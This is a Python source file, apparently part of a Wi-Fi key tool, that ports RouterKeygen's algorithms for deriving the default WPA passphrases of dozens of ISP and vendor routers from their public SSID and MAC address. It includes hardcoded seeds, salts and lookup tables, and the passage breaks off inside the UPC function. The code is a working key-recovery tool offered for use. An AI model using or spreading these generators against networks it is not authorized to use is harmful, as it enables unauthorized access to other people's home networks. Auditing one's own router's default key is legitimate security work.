"""Vendor default-key derivation for ISP routers.

KEYSMITH does not capture a handshake and it does not crack one.  It reads
public beacon data (BSSID + SSID) and *computes* the WPA passphrase that the
ISP firmware generated from that same data.

The algorithms are Python ports of the RouterKeygen project by Rui Araujo and
Luis Fonseca (GPLv3, https://github.com/routerkeygen/routerkeygenPC).  They
are data-derived schemes published by the vendors/ISPs themselves (serial
number and MAC mangling), not a cryptographic attack.

Every function takes ``(ssid, mac)`` where ``mac`` is 12 uppercase hex
characters with no separators, and returns a list of candidate passphrases.
An empty list means "does not apply / cannot be computed".

Licence: GPLv3.  Original copyright remains with the RouterKeygen authors.
"""

from __future__ import annotations

import base64
import hashlib
import os

HERE = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(os.path.dirname(HERE), "data")

ALICE_SEED = bytes.fromhex(
    "64C6DDE3E579B6D986968D3445D23B15CAAF128402AC560005CE2075913FDCE8"
)

# RouterKeygen's 256-character Alice charset.  Six plain runs, one run with a
# capital W (an upstream quirk), then "0123".
ALICE_CHARSET = (
    "0123456789abcdefghijklmnopqrstuvwxyz" * 6
    + "0123456789abcdefghijklmnopqrstuvWxyz"
    + "0123"
)

_ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# ── helpers ────────────────────────────────────────────────────────────────


def _norm(mac: str) -> str:
    return (mac or "").replace(":", "").replace("-", "").upper()


def _mac_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac)


def _hex(value: int, width: int = 0) -> str:
    """``QString::number(value, 16)``: lowercase, no padding when width=0."""
    s = format(value, "x")
    if width and len(s) < width:
        s = s.rjust(width, "0")
    return s


def _md5_hex(data: bytes, take: int | None = None) -> str:
    out = hashlib.md5(data).hexdigest()
    return out[:take] if take else out


def _qright(text: str, width: int) -> str:
    """``QString::rightJustified(width, '0', true)``."""
    return text.rjust(width, "0")


# ── Thomson / SpeedTouch family ────────────────────────────────────────────

THOMSON_DIC = [
    "".join((a, b, c)) for a in _ALNUM for b in _ALNUM for c in _ALNUM
]


def thomson(ssid: str, mac: str, progress=None, cancelled=None) -> list[str]:
    """Thomson, SpeedTouch, Orange, Bbox, Otenet, CYTA, Vodafone, ...

    Brute-forces the (year, week, 3-char salt) tuple whose SHA-1 tail equals
    the last six hex digits of the SSID.  ~21.8M SHA-1 operations.
    """
    try:
        target = int(ssid[-6:], 16)
    except (ValueError, IndexError):
        return []

    out: list[str] = []
    total = len(THOMSON_DIC)
    done = 0
    for hexpart in THOMSON_DIC:
        # The upstream code sprintf()s the three ASCII characters as hex, e.g.
        # "LO4" becomes 4C4F34, so hash the hex text, not the raw bytes.
        raw = hexpart.encode().hex().upper().encode()
        for year in range(4, 13):
            for week in range(1, 53):
                digest = hashlib.sha1(
                    b"CP" + ("%02d%02d" % (year, week)).encode() + raw
                ).digest()
                if (digest[17] << 16) | (digest[18] << 8) | digest[19] == target:
                    out.append(digest[:5].hex().upper())
        done += 1
        if progress and not (done & 0x3FF):
            progress(done, total)
        if cancelled and cancelled():
            break
    return out


# ── Huawei ─────────────────────────────────────────────────────────────────

_HUAWEI = {
    "a0": [0] * 16,
    "a1": list(range(16)),
    "a2": [0, 13, 10, 7, 5, 8, 15, 2, 10, 7, 0, 13, 15, 2, 5, 8],
    "a3": [0, 1, 3, 2, 7, 6, 4, 5, 15, 14, 12, 13, 8, 9, 11, 10],
    "a5": [0, 4, 8, 12] * 4,
    "a7": [0, 8, 0, 8, 1, 9, 1, 9, 2, 10, 2, 10, 3, 11, 3, 11],
    "a8": [0, 5, 11, 14, 6, 3, 13, 8, 12, 9, 7, 2, 10, 15, 1, 4],
    "a10": [0, 14, 13, 3, 11, 5, 6, 8, 6, 8, 11, 5, 13, 3, 0, 14],
    "a14": [0, 1, 3, 2, 7, 6, 4, 5, 14, 15, 13, 12, 9, 8, 10, 11],
    "a15": [0, 1, 3, 2, 6, 7, 5, 4, 13, 12, 14, 15, 11, 10, 8, 9],
    "n5": [0, 5, 1, 4, 6, 3, 7, 2, 12, 9, 13, 8, 10, 15, 11, 14],
    "n6": [0, 14, 4, 10, 11, 5, 15, 1, 6, 8, 2, 12, 13, 3, 9, 7],
    "n7": [0, 9, 0, 9, 5, 12, 5, 12, 10, 3, 10, 3, 15, 6, 15, 6],
    "n11": [0, 14, 13, 3, 9, 7, 4, 10, 6, 8, 11, 5, 15, 1, 2, 12],
    "n12": [0, 13, 10, 7, 4, 9, 14, 3, 10, 7, 0, 13, 14, 3, 4, 9],
    "n13": [0, 1, 3, 2, 6, 7, 5, 4, 15, 14, 12, 13, 9, 8, 10, 11],
    "n14": [0, 1, 3, 2, 4, 5, 7, 6, 12, 13, 15, 14, 8, 9, 11, 10],
    "n31": [0, 10, 4, 14, 9, 3, 13, 7, 2, 8, 6, 12, 11, 1, 15, 5],
}
_HUAWEI_KEY = [30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 62, 63, 64, 65, 66]


def huawei(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    t = _HUAWEI
    m = [int(c, 16) for c in mac]
    ya = (t["a2"][m[0]] ^ t["n11"][m[1]] ^ t["a7"][m[2]] ^ t["a8"][m[3]]
          ^ t["a14"][m[4]] ^ t["a5"][m[5]] ^ t["a5"][m[6]] ^ t["a2"][m[7]]
          ^ t["a0"][m[8]] ^ t["a1"][m[9]] ^ t["a15"][m[10]] ^ t["a0"][m[11]] ^ 13)
    yb = (t["n5"][m[0]] ^ t["n12"][m[1]] ^ t["a5"][m[2]] ^ t["a7"][m[3]]
          ^ t["a2"][m[4]] ^ t["a14"][m[5]] ^ t["a1"][m[6]] ^ t["a5"][m[7]]
          ^ t["a0"][m[8]] ^ t["a0"][m[9]] ^ t["n31"][m[10]] ^ t["a15"][m[11]] ^ 4)
    yc = (t["a3"][m[0]] ^ t["a5"][m[1]] ^ t["a2"][m[2]] ^ t["a10"][m[3]]
          ^ t["a7"][m[4]] ^ t["a8"][m[5]] ^ t["a14"][m[6]] ^ t["a5"][m[7]]
          ^ t["a5"][m[8]] ^ t["a2"][m[9]] ^ t["a0"][m[10]] ^ t["a1"][m[11]] ^ 7)
    yd = (t["n6"][m[0]] ^ t["n13"][m[1]] ^ t["a8"][m[2]] ^ t["a2"][m[3]]
          ^ t["a5"][m[4]] ^ t["a7"][m[5]] ^ t["a2"][m[6]] ^ t["a14"][m[7]]
          ^ t["a1"][m[8]] ^ t["a5"][m[9]] ^ t["a0"][m[10]] ^ t["a0"][m[11]] ^ 14)
    ye = (t["n7"][m[0]] ^ t["n14"][m[1]] ^ t["a3"][m[2]] ^ t["a5"][m[3]]
          ^ t["a2"][m[4]] ^ t["a10"][m[5]] ^ t["a7"][m[6]] ^ t["a8"][m[7]]
          ^ t["a14"][m[8]] ^ t["a5"][m[9]] ^ t["a5"][m[10]] ^ t["a2"][m[11]] ^ 7)
    k = _HUAWEI_KEY
    return ["%d%d%d%d%d" % (k[ya], k[yb], k[yc], k[yd], k[ye])]


_HG824X_HASH = {
    "00": "0D", "08": "05", "10": "0E", "20": "1F", "28": "03", "48": "24",
    "68": "39", "70": "20", "78": "04", "80": "06", "9C": "2A", "AC": "1A",
    "CC": "12", "D4": "23", "E0": "0C", "F8": "21",
}
_HG824X_LAST = {
    8: "F", 9: "0", 0xA: "1", 0xB: "2", 0xC: "3", 0xD: "4", 0xE: "5",
    0xF: "6", 0x0: "7", 0x1: "8", 0x2: "9", 0x3: "A", 0x4: "B", 0x5: "C",
    0x6: "D", 0x7: "E",
}


def hg824x(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    out = mac[6:8]
    if int(mac[10:12], 16) <= 8:
        out += _hex((int(mac[8:10], 16) - 1) & 0xFF)
    else:
        out += mac[8:10]
    last_char = int(mac[11], 16)
    if last_char <= 8:
        out += _hex((int(mac[10], 16) - 1) & 0xF)
    else:
        out += mac[10]
    out += _HG824X_LAST[last_char]
    suffix = _HG824X_HASH.get(mac[0:2])
    if suffix:
        return [(out + suffix).upper()]
    return [(out + "%02X" % i).upper() for i in range(256)]


# ── simple hash schemes ────────────────────────────────────────────────────


def zyxel(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    return [_md5_hex((mac[:8] + ssid[-4:]).lower().encode(), 20).upper()]


def comtrend(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    magic = b"bcgbghgg"
    ssid4 = ssid[-4:]
    if mac[:6] == "001A2B":
        out = []
        for i in range(512):
            if i < 256:
                block, xx = b"64680C", ("%02X" % i).encode()
            else:
                block, xx = b"3872C0", ("%02X" % (i - 256)).encode()
            out.append(_md5_hex(
                magic + block + xx + ssid4.encode() + mac.encode(), 20))
        return out
    mac_mod = (mac[:8] + ssid4).upper().encode()
    return [_md5_hex(magic + mac_mod + mac.encode(), 20)]


def arcadyan(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    c1 = str(int(mac[-4:], 16)).rjust(5, "0")
    s7, s8, s9, s10 = (int(c1[i], 16) for i in (1, 2, 3, 4))
    m9, m10, m11, m12 = (int(mac[i], 16) for i in (8, 9, 10, 11))
    k1 = (s7 + s8 + m11 + m12) & 0x0F
    k2 = (m9 + m10 + s9 + s10) & 0x0F
    key = "".join(_hex(v) for v in (
        k1 ^ s10, k2 ^ m10, m11 ^ s10,
        k1 ^ s9, k2 ^ m11, m12 ^ s9,
        k1 ^ s8, k2 ^ m12, k1 ^ k2,
    ))
    out = [key.upper()]
    if "0" in key:
        out.append(key.replace("0", "1").upper())
    return out


_ARNET_LOOKUP = "0123456789abcdefghijklmnopqrstuvwxyz"


def _arnet_key(mac: str, length: int) -> str:
    digest = hashlib.sha256(ALICE_SEED + b"1236790" + _mac_bytes(mac)).digest()
    return "".join(_ARNET_LOOKUP[b % 36] for b in digest[:length])


def arnetpirelli(ssid: str, mac: str) -> list[str]:
    if len(mac) < 12:
        return []
    base = int(mac, 16)
    keys = [_arnet_key("%012x" % ((base + d) & 0xFFFFFFFFFFFF), 10)
            for d in (0, -2, -1, 1, 2, 3, 4)]
    if ssid.startswith("WiFi-Arnet-"):
        return keys
    if ssid.startswith("ADSLPT-AB"):
        return [k[:8] for k in keys]
    out = []
    for k in keys:
        out.extend((k, k[:8]))
    return out


_PIRELLI_SALT = bytes.fromhex("223311340281FA22114168111201052271421066")


def pirelli(ssid: str, mac: str) -> list[str]:
    try:
        raw = bytes.fromhex(ssid[-12:])
    except ValueError:
        return []
    digest = hashlib.md5(raw + _PIRELLI_SALT).digest()
    key = [
        (digest[0] & 0xF8) >> 3,
        ((digest[0] & 0x07) << 2) | ((digest[1] & 0xC0) >> 6),
        (digest[1] & 0x3E) >> 1,
        ((digest[1] & 0x01) << 4) | ((digest[2] & 0xF0) >> 4),
        ((digest[2] & 0x0F) << 1) | ((digest[3] & 0x80) >> 7),
    ]
    chars = bytes((v + 0x57) if v >= 0x0A else v for v in key)
    return [chars.hex()]


# ── D-Link / Belkin / Sitecom ──────────────────────────────────────────────

_DLINK_HASH = "XrqaHNpdSYw86215"


def dlink(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    order = [11, 0, 10, 1, 9, 2, 8, 3, 7, 4, 6, 5, 1, 6, 8, 9, 11, 2, 4, 10]
    out = []
    for idx in order:
        c = mac[idx].upper()
        if c.isdigit():
            out.append(_DLINK_HASH[int(c)])
        elif "A" <= c <= "F":
            out.append(_DLINK_HASH[ord(c) - ord("A") + 10])
        else:
            return []
    return ["".join(out)]


_BELKIN_CHARSETS = ("024613578ACE9BDF", "944626378ace9bdf")
_BELKIN_ORDERS = (
    (6, 2, 3, 8, 5, 1, 7, 4),
    (1, 2, 3, 8, 5, 1, 7, 4),
    (1, 2, 3, 8, 5, 6, 7, 4),
    (6, 2, 3, 8, 5, 6, 7, 4),
)


def _belkin_key(mac8: str, charset: str, order) -> str:
    return "".join(charset[int(mac8[o - 1], 16)] for o in order)


def _add_one(mac: str) -> str:
    return format(int(mac, 16) + 1, "x")


def belkin(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    out: list[str] = []
    if ssid.startswith("Belkin"):
        out.append(_belkin_key(mac[-8:], _BELKIN_CHARSETS[0], _BELKIN_ORDERS[0]))
        return out
    if ssid.startswith("belkin"):
        mac = _add_one(mac)
        out.append(_belkin_key(mac[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[0]))
        if not mac.startswith("944452"):
            out.append(_belkin_key(mac[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[2]))
            out.append(_belkin_key(mac[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[3]))
            mac = _add_one(mac)
            out.append(_belkin_key(mac[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[0]))
        return out
    for _ in range(3):
        for order in _BELKIN_ORDERS:
            out.append(_belkin_key(mac[-8:], _BELKIN_CHARSETS[0], order))
            out.append(_belkin_key(mac[-8:], _BELKIN_CHARSETS[1], order))
        mac = _add_one(mac)
    return out


_SITECOM_CHARSET = "123456789abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ"


def _sitecom_numeric(mac: str) -> int:
    chunk = ""
    for c in mac[6:]:
        if c in "ABCDEFabcdef":
            break
        chunk += c
    return int(chunk) if chunk else 0


def _sitecom_key(mac: str) -> str:
    n = _sitecom_numeric(mac)
    u = [ord(c) for c in mac]
    cs = _SITECOM_CHARSET
    terms = (
        (n + u[11] + u[5]) * (u[9] + u[3] + u[11]),
        (n + u[11] + u[6]) * (u[8] + u[10] + u[11]),
        (n + u[3] + u[5]) * (u[7] + u[9] + u[11]),
        (n + u[7] + u[6]) * (u[5] + u[4] + u[11]),
        (n + u[7] + u[6]) * (u[8] + u[9] + u[11]),
        (n + u[11] + u[5]) * (u[3] + u[4] + u[11]),
        (n + u[11] + u[4]) * (u[6] + u[8] + u[11]),
        (n + u[10] + u[11]) * (u[7] + u[8] + u[11]),
    )
    return "".join(cs[v % len(cs)] for v in terms)


def sitecom(ssid: str, mac: str) -> list[str]:
    if len(mac) < 12:
        return []
    out = [_sitecom_key(mac.lower()), _sitecom_key(mac.upper())]
    short = mac[:11]
    last = int(mac[11], 16)
    last = (last + 1) % 0x10
    out.append(_sitecom_key(short + _hex(last).upper()))
    last = (last + 1) % 0x10
    out.append(_sitecom_key(short + _hex(last).upper()))
    return out


_SITECOM_2100_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ"


def sitecom_wlr2100(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    digest = hashlib.md5(mac.lower().encode()).digest()
    value = int.from_bytes(digest[-8:], "big")
    out = []
    for _ in range(12):
        out.append(_SITECOM_2100_ALPHABET[value % 24])
        value //= 24
    return ["".join(out)]


_SITECOM_400X = (
    ("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", "W0X1CDYNJU8VOZA0BKL46PQ7RS9T2E5HI3MFG"),
    ("23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ", "WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2"),
    ("JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK", "E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW"),
)
_SITECOM_MAGIC1 = 0x98124557
_SITECOM_MAGIC2 = 0x0004321A
_SITECOM_MAGIC3 = 0x80000000


def _sitecom400x_key(mac: str, charsets) -> str:
    val = int(mac[4:], 16)
    offsets = []
    for _ in range(12):
        if val & 0x1 == 0:
            val ^= _SITECOM_MAGIC2
            val >>= 1
        else:
            val ^= _SITECOM_MAGIC1
            val >>= 1
            val |= _SITECOM_MAGIC3
        offsets.append(val % len(charsets[0]))
    out = [charsets[0][offsets[0]]]
    for i in range(11):
        if offsets[i] != offsets[i + 1]:
            out.append(charsets[0][offsets[i + 1]])
        else:
            out.append(charsets[1][(offsets[i] + i) % len(charsets[1])])
    return "".join(out)


def sitecom_wlr400x(ssid: str, mac: str) -> list[str]:
    if len(mac) < 12:
        return []
    variants = [mac]
    last = (int(mac[11], 16) + 1) % 0x10
    variants.append(mac[:11] + _hex(last))
    last = (last + 3) % 0x10
    variants.append(mac[:11] + _hex(last))
    out = []
    for m in variants:
        for cs in _SITECOM_400X:
            out.append(_sitecom400x_key(m, cs))
    return out


# ── generic suffix manglers ────────────────────────────────────────────────


def bssid(ssid: str, mac: str, length: int = 12, offset: int = 0,
          upper: bool = True, lower: bool = False, cut_left: bool = False) -> list[str]:
    """RouterKeygen's BssidKeygen: take the last N hex digits and add ``offset``."""
    if len(mac) != 12:
        return []
    if length == 8:
        t = mac[:8] if cut_left else mac[-8:]
        last = int(t[-6:], 16)
        t = t[:2] + _hex((last + offset) & 0xFFFFFFFF, 6)[-6:]
    elif length == 10:
        t = mac[:10] if cut_left else mac[-10:]
        last = int(t[-6:], 16)
        t = t[:4] + _hex((last + offset) & 0xFFFFFFFF, 6)[-6:]
    elif length == 12:
        last = int(mac[-6:], 16)
        t = mac[:6] + _hex((last + offset) & 0xFFFFFFFF, 6)[-6:]
    else:
        return []
    out = []
    if upper:
        out.append(t.upper())
    if lower:
        out.append(t.lower())
    return out


def basex(ssid: str, mac: str, length: int = 10, offset: int = 0,
          base: int = 10, nibbles: int = 6,
          upper: bool = False, lower: bool = True) -> list[str]:
    if len(mac) != 12:
        return []
    value = int(mac[-nibbles:], 16) + offset
    s = format(value, "x") if base == 16 else str(value)
    s = _qright(s, length)
    out = []
    if upper:
        out.append(s.upper())
    if lower:
        out.append(s.lower())
    return out


# ── table-driven ISP algorithms ────────────────────────────────────────────

_cache: dict[str, object] = {}


def _tele2_table():
    table = _cache.get("tele2")
    if table is None:
        table = {}
        try:
            with open(os.path.join(DATA_DIR, "tele2.txt"), "r",
                      encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    parts = line.split()
                    if len(parts) < 6:
                        continue
                    table.setdefault(parts[0], []).append(
                        (int(parts[1], 16), int(parts[2], 16), parts[3],
                         int(parts[4], 16), int(parts[5])))
        except OSError:
            table = {}
        _cache["tele2"] = table
    return table


def teletu(ssid: str, mac: str) -> list[str]:
    if len(mac) < 12:
        return []
    entries = _tele2_table().get(mac[:6], [])
    if not entries:
        return []
    value = int(mac[6:12], 16)
    out = []
    for start, end, serial, base, divider in entries:
        if start <= value <= end and divider:
            serial_int = (value - base) // divider
            out.append(serial + "Y" + str(serial_int).rjust(7, "0"))
    return out


def _alice_table():
    table = _cache.get("alice")
    if table is None:
        table = {}
        try:
            with open(os.path.join(DATA_DIR, "alice.txt"), "r",
                      encoding="utf-8-sig", errors="replace") as fh:
                for line in fh:
                    parts = line.strip().split(",")
                    if len(parts) < 5:
                        continue
                    table.setdefault(parts[0], []).append(
                        (parts[1], int(parts[2]), int(parts[3]), parts[4].upper()))
        except OSError:
            table = {}
        _cache["alice"] = table
    return table


def _alice_hash(serial_str: str, mac: str) -> str:
    digest = hashlib.sha256(ALICE_SEED + serial_str.encode()
                            + _mac_bytes(mac[:12])).digest()
    return "".join(ALICE_CHARSET[b] for b in digest[:24])


def alice_italy(ssid: str, mac: str) -> list[str]:
    """``mac`` may be a bare 6-character vendor prefix (see the matcher)."""
    if not ssid.startswith(("Alice-", "alice-")):
        return []
    entries = _alice_table().get(ssid[6:9], [])
    if not entries:
        return []
    try:
        ssid_num = int(ssid[-8:])
    except ValueError:
        return []

    out: list[str] = []
    for serial, k, q, vendor_mac in entries:
        serial_str = serial + "X" + str((ssid_num - q) // k).rjust(7, "0")
        if len(mac) == 12 and mac[:6] == vendor_mac:
            out.append(_alice_hash(serial_str, mac))

        mac_eth = (mac[:6] if len(mac) >= 6 else vendor_mac)
        for extra in range(10):
            calc = _hex(int(str(extra) + ssid[-8:])).upper()
            if mac_eth[5] == calc[0]:
                mac_eth += calc[-6:]
                break
        if mac_eth == (mac[:6] if len(mac) >= 6 else vendor_mac):
            continue
        key = _alice_hash(serial_str, mac_eth)
        if key not in out:
            out.append(key)
    return out


def alice_germany(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    tail = (int(mac[6:12], 16) - 1) & 0xFFFFFF
    digest = _md5_hex((mac[:6] + "%06x" % tail).lower().encode(), 12)
    return [base64.b64encode(digest.encode()).decode()]


def wlan2(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    k = [mac[i] for i in (10, 11, 0, 1, 8, 9, 2, 3, 4, 5, 6, 7,
                          10, 11, 8, 9, 2, 3, 4, 5, 6, 7, 0, 1, 4, 5)]
    if not ssid[-2:-1].isdigit():
        try:
            value = int(k[0] + k[1], 16) - 1
        except ValueError:
            return []
        s = _hex(value, 2)
        k[0], k[1] = s[0], s[1]
    return ["".join(k)]


def wlan6(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12 or len(ssid) < 6:
        return []
    ssid_part = [ord(c) - 55 if c >= "A" else ord(c) for c in ssid[-6:]]
    bssid_last = [ord(c) - 55 if c >= "A" else ord(c) for c in mac[-2:]]
    out = []
    for i in range(10):
        aux = i + (ssid_part[3] & 0xF) + (bssid_last[0] & 0xF) + (bssid_last[1] & 0xF)
        aux1 = ((ssid_part[1] & 0xF) + (ssid_part[2] & 0xF)
                + (ssid_part[4] & 0xF) + (ssid_part[5] & 0xF))
        b = [0] * 13
        b[1] = aux ^ (ssid_part[5] & 0xF)
        b[5] = aux ^ (ssid_part[4] & 0xF)
        b[9] = aux ^ (ssid_part[3] & 0xF)
        b[2] = aux1 ^ (ssid_part[2] & 0xF)
        b[6] = aux1 ^ (bssid_last[0] & 0xF)
        b[10] = aux1 ^ (bssid_last[1] & 0xF)
        b[3] = (bssid_last[0] & 0xF) ^ (ssid_part[5] & 0xF)
        b[7] = (bssid_last[1] & 0xF) ^ (ssid_part[4] & 0xF)
        b[11] = aux ^ aux1
        b[4] = b[1] ^ b[7]
        b[8] = b[6] ^ b[10]
        b[12] = b[2] ^ b[9]
        b[0] = b[11] ^ b[5]
        out.append("".join(_hex(v & 0xF) for v in b).upper())
    return out


def discus(ssid: str, mac: str) -> list[str]:
    try:
        value = int(ssid[-6:], 16)
    except ValueError:
        return []
    return ["YW0" + str(((value - 0xD0EC31) & 0xFFFFFFFF) >> 2)]


_EIRCOM_DIGITS = ("Zero", "One", "Two", "Three", "Four", "Five", "Six",
                  "Seven", "Eight", "Nine")


def eircom(ssid: str, mac: str) -> list[str]:
    if len(mac) < 12:
        return []
    value = int(mac[-6:], 16) + 0x01000000
    words = ""
    while value > 0:
        words = _EIRCOM_DIGITS[value % 10] + words
        value //= 10
    text = words + "Although your world wonders me, "
    return [hashlib.sha1(text.encode()).hexdigest()[:26]]


def infostrada(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    return ["2" + mac.upper(), "2" + mac.lower()]


def intercable(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    short = mac[:10]
    last = int(mac[10:12], 16)
    return ["m" + (short + _hex((last + n) & 0xFF, 2)[-2:]).lower()
            for n in (1, 2)]


def ono(ssid: str, mac: str) -> list[str]:
    if len(ssid) != 13:
        return []
    try:
        tail = int(ssid[12]) + 1
    except ValueError:
        return []
    val = ssid[:11] + ("0%d" % tail if tail < 10 else str(tail))
    seed = [0, 0, 0, 0]
    for i, ch in enumerate(val):
        seed[i % 4] ^= ord(ch)
    rand = (seed[0] | (seed[1] << 8) | (seed[2] << 16) | (seed[3] << 24)) & 0xFFFFFFFF
    key = []
    for _ in range(5):
        rand = (rand * 0x343FD + 0x269EC3) & 0xFFFFFFFF
        key.append(_hex((rand >> 16) & 0xFF).upper())
    pad = (val * (1 + 64 // len(val)))[:64]
    return ["".join(key), hashlib.md5(pad.encode()).hexdigest()[:26].upper()]


def ote_baud(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    return ["0" + mac.lower()]


_PBS_LOOKUP = "0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz"
_PBS_SALT = bytes.fromhex(
    "54454F74656CB6D986968D3445D23B15CAAF128402AC560005CE2075943FDCE8"
)


def pbs(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    raw = bytearray(_mac_bytes(mac))
    raw[5] = (raw[5] - 5) & 0xFF
    digest = hashlib.sha256(_PBS_SALT + bytes(raw)).digest()
    return ["".join(_PBS_LOOKUP[b % len(_PBS_LOOKUP)] for b in digest[:13])]


def cabovisao_sagem(ssid: str, mac: str) -> list[str]:
    ident = ssid[-4:].lower()
    return ["2ce412e" + c + ident for c in "abcd"]


def speedport500(ssid: str, mac: str, minus: str = "") -> list[str]:
    if len(mac) != 12 or len(ssid) < 11:
        return []
    first = ssid[9]
    block = ssid[10] + mac[-3:]
    return ["SP" + minus + first + z + block + x + y + z
            for x in "0123456789" for y in "0123456789" for z in "0123456789"]


def axtel(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    sub = ssid[-4:]
    out = []
    if sub.lower() == mac[-4:].lower():
        out.append(mac[2:].upper())
    if (int(mac[-2:], 16) - 1) & 0xFF == int(sub[-2:], 16):
        m1 = "%02x" % (int(mac[2:4], 16) + 1)
        out.append((m1 + mac[6:8] + sub).upper())
    return out


def verizon(ssid: str, mac: str) -> list[str]:
    try:
        value = int(ssid[:5][::-1], 36)
    except ValueError:
        return []
    result = _hex(value).rjust(6, "0").upper()
    if not mac:
        return ["1801" + result, "1F90" + result]
    return [mac[2:6] + result]


def wifimedia_r(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    key = mac[:11].lower() + "0"
    return [key, key.upper()]


def tpw4g(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    return ["8747" + mac[-6:].upper()]


def pldt(ssid: str, mac: str, variant: int = 0) -> list[str]:
    if len(mac) != 12:
        return []
    if variant == 0:
        return ["PLDTWIFI" + mac[-5:].upper()]
    value = int(mac[-6:], 16) ^ 0xFFFFFF
    return ["wlan" + _hex(value, 6)[-6:].lower()]


def eijsink(ssid: str, mac: str) -> list[str]:
    cleaned = ssid.replace("k5", "").replace("K5", "")
    return ["951" + cleaned[-5:]]


def gontwifi(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    return ["000000" + mac[9] + mac[8] + mac[7] + mac[6]]


_SKY_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


def sky_v1(ssid: str, mac: str) -> list[str]:
    if len(mac) != 12:
        return []
    digest = hashlib.md5(mac.encode()).digest()
    return ["".join(_SKY_ALPHABET[digest[i] % 26] for i in range(1, 16, 2))]


def tecom(ssid: str, mac: str) -> list[str]:
    return [hashlib.sha1(ssid.upper().encode()).hexdigest()[:26]]


def andared(ssid: str, mac: str) -> list[str]:
    return ["6b629f4c299371737494c61b5a101693a2d4e9e1f3e1320f3ebf9ae379cecf32"]


def conn(ssid: str, mac: str) -> list[str]:
    return ["1234567890123"]


def ote_huawei(ssid: str, mac: str, magic: str) -> list[str]:
    if len(mac) != 12:
        return []
    series = mac[:2] + mac[6:8]
    points = {"E8FD": 0, "E8F5": 1, "E8F6": 2}
    point = points.get(series)
    if point is None:
        return []
    fields = magic.split(" ")
    if point >= len(fields):
        return []
    return [("000000" + fields[point])[-8:]]


# ── UPC (Technicolor 07 firmware) ──────────────────────────────────────────

_UPC_MAGIC24 = 0xFF8D8F20
_UPC_MAGIC5 = 0xFFD9DA60
_UPC_MAGIC0 = 0xB21642C9
_UPC_MAGIC1 = 0x68DE3AF
_UPC_MAGIC2 = 0x6B5FCA6B
_UPC_PREFIXES = ("SAAP", "SAPP", "UAAP", "SBAP")


def _u32(x: int) -> int:
    return x & 0xFFFFFFFF


def _upc_generate_ssid(data, magic: int) -> int:
    """Exact C semantics of ``Upc07Keygen::upc_generate_ssid``."""
    a = data[1] * 10 + data[2]
    b = _u32(data[0] * 2500000 + a * 6800 + data[3] + magic)
    q = ((b * _UPC_MAGIC2) >> 54) - (b >> 31)
    return _u32(b - q * 10000000)


def _upc_mangle(pp) -> int:
    a = ((pp[3] * _UPC_MAGIC1) >> 40) - (pp[3] >> 31)
    b = _u32((pp[3] - a * 9999 + 1) * 11)
    return _u32(b * (pp[1] * 100 + pp[2] * 10 + pp[0]))


def _upc_pass(digest: bytes) -> str:
    out = []
    for b in digest[:8]:
        a = b & 0x1F
        a -= ((a * _UPC_MAGIC0) >> 36) * 23
        a = (a & 0xFF) + 0x41
        if a >= ord("I"):
            a += 1
        if a >= ord("L"):
            a += 1
        if a >= ord("O"):
            a += 1
        out.append(chr(a))
    return "".join(out)


def upc07(ssid: str, mac: str, progress=None, cancelled=None) -> list[str]:
    """Technicolor UPC (07 firmware).

    Upstream brute-forces ``b3`` 0..9999 per ``(b0,b1,b2)``.  Because the
    generated SSID is ``raw % 10_000_000`` for ``raw < 2**31`` and is always
    ``>= 10_000_000`` above that (verified exhaustively against the C code),
    the matching ``b3`` is unique and can be solved directly.
    """
    try:
        target = int(ssid[-7:], 10)
    except ValueError:
        return []
    M = 0x100000000
    LIMIT = 0x80000000
    out = []
    seen = set()

    def solve(base: int):
        """The single b3 in 0..9999 whose raw value matches ``target``."""
        found = []
        # Non-wrapping: raw = target + k*10^7 inside [base, base+9999].
        if base <= target:
            raw = target
        else:
            raw = target + ((base - target + 9999999) // 10000000) * 10000000
        if base <= raw <= base + 9999 and raw < LIMIT:
            found.append(raw - base)
        # Wrapping: base + b3 passed 2**32 and landed exactly on target.
        b3 = (target - base) % M
        if b3 <= 9999 and b3 not in found and base + b3 >= M:
            found.append(b3)
        return found

    for b0 in range(10):
        for b1 in range(100):
            for b2 in range(10):
                hits = []
                for magic, mode in ((_UPC_MAGIC24, 1), (_UPC_MAGIC5, 2)):
